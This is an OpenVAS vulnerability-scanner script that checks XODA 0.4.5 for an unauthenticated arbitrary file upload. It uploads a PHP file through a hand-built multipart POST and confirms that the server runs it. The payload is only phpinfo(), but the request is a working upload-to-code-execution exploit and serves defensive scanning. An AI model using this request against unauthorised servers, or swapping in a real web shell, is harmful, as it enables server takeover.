###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xoda_55127.nasl 12 2013-10-27 11:15:33Z jan $
#
# XODA Arbitrary File Upload and HTML Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "XODA is prone to an arbitrary file-upload vulnerability and multiple
HTML-injection vulnerabilities because it fails to properly sanitize
user-supplied input.

An attacker could exploit these issues to execute arbitrary script
code in a user's browser in the context of the affected site or
execute arbitrary code on the server.

XODA 0.4.5 is vulnerable; other versions may also be affected.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103548";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(55127);
 script_tag(name:"cvss_base", value:"9.7");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:P");
 script_version ("$Revision: 12 $");

 script_name("XODA Arbitrary File Upload and HTML Injection Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/55127");

 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-08-22 11:33:41 +0200 (Wed, 22 Aug 2012)");
 script_description(desc);
 script_summary("Determine if it is possible to upload a file");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/xoda",cgi_dirs());

foreach dir (dirs) {
   
  url = dir + '/?upload_to='; 

  if(http_vuln_check(port:port, url:url,pattern:"<h4>Upload a file")) {

    host = get_host_name();
    file = "openvas_" + rand() + ".php";
    ex = "<?php phpinfo(); ?>";
    len = 361 + strlen(file);

    req = string("POST ",dir,"/?upload HTTP/1.1\r\n",
                 "Host: ",host,"\r\n",
                 "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:13.0) Gecko/20100101 OpenVAS/13.0\r\n",
                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                 "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n",
                 "DNT: 1\r\n",
                 "Connection: keep-alive\r\n",
                 "Referer: http://",host,"/xoda/?upload_to=\r\n",
                 "Content-Type: multipart/form-data; boundary=---------------------------161664008613401129571781664881\r\n",
                 "Content-Length: ",len,"\r\n",
                 "\r\n",
                 "-----------------------------161664008613401129571781664881\r\n",
                 'Content-Disposition: form-data; name="files_to_upload[]"; filename="',file,'"',"\r\n",
                 "Content-Type: application/x-php\r\n",
                 "\r\n", 
                 "<?php phpinfo(); ?>\r\n",
                 "\r\n",
                 "-----------------------------161664008613401129571781664881\r\n",
                 'Content-Disposition: form-data; name="pwd"',"\r\n",
                 "\r\n",
                 "\r\n", 
                 "-----------------------------161664008613401129571781664881--\r\n"); 

    result = http_send_recv(data:req, port:port);

    if("Location:" >< result) {

      url = dir + '/files/' + file;
      req = http_get(item:url, port:port);
      buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

      if("<title>phpinfo()" >< buf) {
        security_hole(port:port);
        exit(0);
      }

    } 
  }
}

exit(0);
